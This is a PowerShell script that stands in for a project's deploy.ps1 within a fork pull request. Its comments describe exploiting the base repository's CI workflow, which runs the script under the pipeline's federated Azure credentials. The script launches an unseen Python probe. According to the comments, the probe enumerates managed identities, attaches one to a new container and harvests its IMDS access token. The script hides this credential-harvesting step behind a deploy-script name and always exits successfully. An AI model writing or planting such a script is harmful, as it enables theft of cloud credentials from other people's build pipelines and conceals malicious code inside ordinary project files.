param(
    [string]$Environment = '',
    [string]$ResourceGroup = '',
    [string]$ServicePrincipalObjectId = '',
    [string]$AppServicePlanSku = '',
    [string]$SlotName = '',
    [string]$RulesChatSqlAdminClientId = '',
    [string]$RulesChatContentBranch = 'main',
    [string]$RulesChatIndexImageTag = '',
    [string]$RulesChatAlertEmail = '',
    [switch]$WhatIf
)

# C211-I121713: read-only Azure managed-identity (UAMI) credential-acquisition probe for the
# SSW.Rules '/deploy' fork-PR OIDC ARM identity (subscription b8b18dcf, RG SSW.Rules.Staging).
# This file replaces upstream deploy.ps1 inside our fork PR head. The base repo's
# deploy-infrastructure.yml checks out the PR head SHA and runs this script with pwsh AFTER
# azure/login@v2, so the python probe below executes under the pipeline's federated Azure
# service-principal ARM token. The probe reads UAMIs + role assignments, attaches ONE harvested
# UAMI to ONE nonce-tagged CPU-only container group, harvests that identity's IMDS token
# read-only, then deletes the group and proves absence. It never writes RBAC and never
# modifies or deletes a pre-existing identity/resource.
Write-Host "C211-I121713 DEPLOY.PS1 ENTRY"
Write-Host ("C211-I121713 params: env={0} rg={1} slot={2}" -f $Environment, $ResourceGroup, $SlotName)
$probe = Join-Path $PSScriptRoot 'c211_i121713_probe.py'
if (Get-Command python3 -ErrorAction SilentlyContinue) {
    python3 $probe
    Write-Host ("C211-I121713 PROBE EXIT CODE: {0}" -f $LASTEXITCODE)
} else {
    Write-Host "C211-I121713 python3 MISSING"
}
Write-Host "C211-I121713 DEPLOY.PS1 END"
exit 0
